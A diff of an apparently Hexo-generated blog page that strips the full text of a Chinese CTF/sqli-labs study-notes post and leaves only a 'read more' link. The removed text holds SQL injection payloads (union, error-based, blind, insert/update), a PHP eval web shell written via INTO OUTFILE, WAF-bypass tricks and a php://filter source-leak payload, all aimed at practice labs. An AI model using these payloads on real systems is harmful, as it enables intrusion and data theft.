@@ -380,7 +380,7 @@
                 
               
 
-              <time title="创建时间：2019-10-26 11:53:22 / 修改时间：11:50:48" itemprop="dateCreated datePublished" datetime="2019-10-26T11:53:22+08:00">2019-10-26</time>
+              <time title="创建时间：2019-10-26 11:53:22 / 修改时间：11:54:33" itemprop="dateCreated datePublished" datetime="2019-10-26T11:53:22+08:00">2019-10-26</time>
             
 
             
@@ -448,35 +448,16 @@
 
       
         
+          <h1 id="sql-labs试炼："><a href="#sql-labs试炼：" class="headerlink" title="sql-labs试炼："></a>sql-labs试炼：</h1>
+          <!--noindex-->
           
-            <h1 id="sql-labs试炼："><a href="#sql-labs试炼：" class="headerlink" title="sql-labs试炼："></a>sql-labs试炼：</h1><p>基础方法<br>order by 经常用不了，所以要用union select 可以判断列数<br>1、有关union select：<br>判断注入位。然后<br>前提条件：有显示位（即有数据库展示数据的位置）</p>
-<p>常用方法：<br>group_concat()：一次性打出<br>语句中夹杂的limit：sql在查询时，经常会出现多行结果，用limit可以限定打出的结果，比如仅仅打出第一行，就使用limit 0,1，想打出查询结果的第二行和第四行，用limit 1,3（从第二行到第四行）</p>
-<p>mysql的information_schema库内含数据库的许多信息：<br>综合以上一般注入可以用到：<br>①、1,2,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=database()  #表示 + 一次性打出 + 当前数据库的所有的表名，from语句必须放在union select 后面。<br>②、group_concat(column_name) from INFORMATION_SCHEMA.columns where table_schema=database()  #表示 + 一次性打出 + 当前数据库的所有的col（列）<br>③、select concat((select database()))：显示当前数据库名字，<br>④、substr(str,int,int)：截取str字符串，从int位开始，截取int位，这里是从1开始，第一个字母为1</p>
-<h2 id="sql报错盲注："><a href="#sql报错盲注：" class="headerlink" title="sql报错盲注："></a>sql报错盲注：</h2><p>三种方式：floor（输出长度64位），updatexml（32位，且payload返回不是xml格式），extractvalue（32位））<br>以下为sqllabs less5（利用floor）：<br>①、爆出当前数据库、用户名：（[1]是为了凑够一行）<br><code>id=1&#39; union select count(*),[1],concat((select database()), floor(rand(0)*2))as a from information_schema.columns group by a --+</code> 报错注入的例句，该句会爆出当前使用数据库的名称和一个1或者0的随机数：concat()连接函数，floor()取整函数，rand()是随机生成一个0-1的数字。同时，我们还可以替换掉database()，替换成version()，则会爆出所选的版本。#使用于ubuntu版本的mysql</p>
-<p>②、爆出某个数据库的表：<br><code>id=1&#39; union select count(*),[1], concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+</code>，更改limit后面的第一个数字数字可以爆出所有的表（此处信息超过一行，所以就不能使用group_concat，替换成concat并使用limit，limit代表输出的起始位置，1代表输出1一个，即从0开始输出1一个）。security是已经获取的数据库</p>
-<p>③、爆出某表某列：<br><code>id=1&#39; union select count(*),[1], concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;security(数据库)&#39; and table_name=&#39;emails(表名)&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+</code><br>修改limit后面的数字可以爆出所有的列。</p>
-<p>④、爆出数据：<br><code>id=1&#39; union select count(\*),[1], concat(&#39;~&#39;,(select email_id from emails limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+</code></p>
-<h2 id="sql-已得权限-注入（less-7）："><a href="#sql-已得权限-注入（less-7）：" class="headerlink" title="sql 已得权限 注入（less-7）："></a>sql 已得权限 注入（less-7）：</h2><p>得拥有能够读写的权利，且拥有一个明确的绝对路径，文件必须小于max_allowed_packet。<br>（判断是否有读写权限的sql语句：and (select count(*) from mysql.user)&gt;0 如果结果正常说明有读写权利）<br>利用语句<code>select &lt;?php @eval($_POST[&quot;haha&quot;])?&gt; into outpile &quot;一个明确的服务器路径&quot;</code>，给服务器传入一个php文件，此时服务器里面就会有一个这个文件存在你写的路径里面，此时便可以用菜刀来做了。</p>
-<h2 id="sql-时间延迟盲注（建议用python写脚本，就相当于真盲注）："><a href="#sql-时间延迟盲注（建议用python写脚本，就相当于真盲注）：" class="headerlink" title="sql 时间延迟盲注（建议用python写脚本，就相当于真盲注）："></a>sql 时间延迟盲注（建议用python写脚本，就相当于真盲注）：</h2><p>可以先看过滤情况，再判断是使用<code>if(exp1,exp2,exp3)</code>(使用方法：如果exp1成立，则执行exp2，否则执行exp3)还是使用<code>case when exp1 then sleep(x) else 1 end</code>（当exp1成立，则sleep x秒，否则就是以1结束），也就是如果注入成功，则页面会sleep x秒，否则直接出现页面不会sleep</p>
-<h2 id="sql-真-盲注（Less-8）（python写脚本）："><a href="#sql-真-盲注（Less-8）（python写脚本）：" class="headerlink" title="sql (真)盲注（Less-8）（python写脚本）："></a>sql (真)盲注（Less-8）（python写脚本）：</h2><p>也是在找到注入点之后进行注入。(这里加入单引号为注入点)</p>
-<p>①爆数据库：<br>url修改为: url+<code>&quot;?id=1&#39; and ascii(substr(database(),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&#39;--+</code>，i是代表数据库的第几位数，j是代表ascii码，利用返回的网页源码和正则匹配判断网页是否正常（”显示You are in…..”），通过此方法得到数据库的完整名。此时<strong>已经爆出数据库名为security</strong></p>
-<p>②爆表：<br>url修改为: url+<code>&quot;?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit &quot;+&quot;str(x)&quot;+&quot;,1),&#39;+str(i)+&#39;,1))=str(j)&quot;</code>，其中x代表是位置为x的表，i代表该位置表的第i位，j代表该位置表的第i位的ascii码，通过此方法可以爆出security下面所有的表</p>
-<h2 id="sql-insert-into注入-bugku-insert-into注入-新版本无法注入（会报错显示Truncated-incorrect-DOUBLE-value）"><a href="#sql-insert-into注入-bugku-insert-into注入-新版本无法注入（会报错显示Truncated-incorrect-DOUBLE-value）" class="headerlink" title="sql insert into注入(bugku insert into注入 )新版本无法注入（会报错显示Truncated incorrect DOUBLE value）"></a>sql insert into注入(bugku insert into注入 )新版本无法注入（会报错显示Truncated incorrect DOUBLE value）</h2><p>网站执行的sql语句为：<code>insert into client_ip (ip) values (&#39;$ip&#39;)</code>，伪造xff头，为<code>1&#39; and sleep(5)) #</code>输入构建成完整语句：<code>insert into client_ip (ip) values (&#39;1&#39; and sleep(5))</code>，此时会发现网页会sleep 5秒，即insert注入成功，再修改sleep(5)为其他注入语句即可<br><strong>似乎在insert注入中无法使用–+截断之后的字符，要用#</strong></p>
-<h2 id="sql-update注入（Less-17）"><a href="#sql-update注入（Less-17）" class="headerlink" title="sql update注入（Less-17）:"></a>sql update注入（Less-17）:</h2><p>先找到注入点（也就是后面加什么符号），然后利用注入语句<code>updatexml(2,concat(0x7e,(select database())),0)</code>+收尾即可</p>
-<h2 id="sql-异或注入（bugku-sql注入2）："><a href="#sql-异或注入（bugku-sql注入2）：" class="headerlink" title="sql 异或注入（bugku-sql注入2）："></a>sql 异或注入（bugku-sql注入2）：</h2><p>1、.DS_Store扫描漏洞<br><strong>2</strong>：（重点），这题过滤了许多字符。但通过bp发现<code>&#39;</code>,<code>-</code>没有被过滤，无法使用一般的<code>--+</code>等其他方法注释掉其他方法。找到闭合点为<code>&#39;</code>，构造登陆语句为：<code>admin &#39;-(xxx)-&#39;</code>进行注入（xxx可以使用任意能连接and的语句）<br>解释：<br><img src="https://i.loli.net/2019/10/07/Dn2r9iBmcGjLfS4.png" alt><br>后面的<code>&#39;</code>为了闭合，<code>-</code>就是减号，<code>&#39;&#39;</code>而符合条件的正常字符串结果为1，where语句就相当于对每一行的col值进行判断，判断where表达式的值是否为1，是就输出该行的col值。<br>所以此题可以通过判断返回的是否是用户名错误（正常情况下用户名就是admin，密码可以随便输入，因为它是先判断用户名是否正确再判断密码是否正确）或者密码错误的情况判断括号里面的表达式是否正确，如果正确就返回密码错误，反之则是账号错误。</p>
-<p><strong>过滤技巧：</strong><br>1、由于此题空格和,都被过滤了，可用的方法就少了，substr，mid，left等方法不能使用逗号，就要换方法使用，比如substr(‘abcde’from(1)for(1))=a（数字两边一定要有括号，其他同理，第一个，都要替换成for(这里的)，注意，from的第一个字母为1，），此题ascii没有过滤，索性使用ascii方法注入（注意，如果是一个长字符串，ascii方法测试的仅仅是第一个字符串）。之后就可以使用python脚本注入了。（空格可以用/*<em>/代替，语句之间用+也可以）<br>2、等号过滤之后可以使用<code>!(exp1&lt;&gt;exp2)</code>，这等于exp1=exp2，还有like，in，between…and…（&gt;=前面且&lt;=后面）等方法。<br>3、select过滤之后可以尝试使用/\</em>!%53eLEct*/绕过，修改成sel+ect（效果甚微，一种方式），修改大小写，修改成url编码，修改成s/**/e/**/l/**/e/**/c/**/t，修改成chr(xx)+chr(xx)+chr(xx)的形式，修改成hex格式，或者内嵌入会被过滤掉的字符</p>
-<h1 id="ip欺骗"><a href="#ip欺骗" class="headerlink" title="ip欺骗"></a>ip欺骗</h1><p>Remote Address：具有一定的防篡改功能（修改之后获取不到响应报文），是发送请求的源地址，但如果被服务器的反向代理器转发，就收不到用户的真实IP，所以就有了xff，xff用来存储用户的真实地址，然后发送给后端<br>xff（X-Forwarded-For）：是http请求端真正的ip，也就是用户的ip，但可以被修改</p>
-<p>做题时可以通过修改xff获取flag。</p>
-<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>执行命令：<br><img src="_v_images/20190904210123976_4347.png" alt></p>
-<h1 id="XSS做题记录"><a href="#XSS做题记录" class="headerlink" title="XSS做题记录"></a>XSS做题记录</h1><p>1、设法弹窗：<br>①如果被过滤掉了\&lt;script>标签，可以直接尝试使用其他标签在标签中加入onerror，<br>②如果输入\<xxx>或者&lt;/\xxx&gt;都会被过滤，</xxx></p>
-<h1 id="upload-试炼"><a href="#upload-试炼" class="headerlink" title="upload 试炼"></a>upload 试炼</h1><p>1、 通过截断上传数据包，修改Content-Type来上传</p>
-<h1 id="？？"><a href="#？？" class="headerlink" title="？？"></a>？？</h1><p>1、对于定时刷新的网页，可以用python的session提交。<br>2、</p>
-<h1 id="php伪协议获取当前php页面源码："><a href="#php伪协议获取当前php页面源码：" class="headerlink" title="php伪协议获取当前php页面源码："></a>php伪协议获取当前php页面源码：</h1><p><code>?page=php://filter/read=convert.base64-encode/resource=xxx.php</code></p>
-<h1 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h1><p>  <img src="https://img-blog.csdnimg.cn/2018110515185387.png" alt="在这里插入图片描述">  </p>
-<h1 id="一般题记录"><a href="#一般题记录" class="headerlink" title="一般题记录"></a>一般题记录</h1><p>漏洞绕过：<br>1、要求$_GET[‘num’]==1，但is_numeric函数判断输入的是否是纯数字，输入任意1+str都可以过。<br>2、php的ereg(i)函数，可以使用%00截断，这个%00会被转义成\0，被算作一个结束符，也就是一个字符</p>
-<p><font size="4"><strong>3、文件绕过：上传php文件，有关php的文件类型有php2,php3,php4,php5,phtml,phtm,phps。</strong></font><br>4、intval漏洞：intval(“十六进制”)会返回0，但intval(“十六进制+1”)会强制转换成数形。(旧版本漏洞)<br>5、php的chr()本质是对256取余，遇到类似判定可使用。<br>6、代替空格的方法：<br>     %09 TAB键（水平）<br>    ​ %0a 新建一行<br>    ​ %0b TAB键（垂直）<br>    ​ %0c 新的一页<br>    ​ %0d return功能<br>    ​ %a0 空格<br>7、django使用的gbk编码，超过%F7的编码在gbk中无意义，当站点设置的CURLOPT_SAFE_UPLOAD为True时，如果在请求前面加@，phpcurl组件会把后面的字符当成绝对路径请求来读取文件，当且仅当文件中存在中文字符的时候。django才会报错获取文件内容。<br>8、php5.5.0前，传入修饰符’\e’会使preg_replace方法的replacement（第二个参数）部分会被执行成php代码(前提能发生替换行为)，PHP正则开头前会要加/<br>9、当system(“”)无法使用时，可以使用print_r(scandir(‘.’))获取路径，var_dmup(file_get_contents(‘路径’))</p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/10/26/ctf学习/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
